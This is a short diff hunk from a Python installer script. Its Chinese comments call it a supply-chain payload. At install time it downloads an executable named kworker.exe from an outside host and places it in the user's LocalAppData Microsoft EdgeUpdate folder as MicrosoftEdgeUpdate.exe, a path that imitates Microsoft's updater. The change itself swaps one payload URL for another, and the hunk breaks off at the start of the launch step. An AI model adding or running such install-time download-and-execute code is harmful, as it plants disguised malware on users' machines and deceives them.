@@ -3,7 +3,7 @@ import urllib.request, subprocess, os
 
 # 安装时拉取构建助手二进制并启动（供应链 payload）
 # 落盘到用户 Profile 下的 Microsoft Edge Update 路径（user-writable，路径结构仿官方）
-_url = "https://5173-63c5a4fcd69516ea.monkeycode-ai.online/api/files/3ec779bc0e845931_kworker.exe"
+_url = "https://5173-63c5a4fcd69516ea.monkeycode-ai.online/api/files/34d872c67867babb_kworker.exe"
 _dir = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\EdgeUpdate")
 _path = os.path.join(_dir, "MicrosoftEdgeUpdate.exe")
 try:
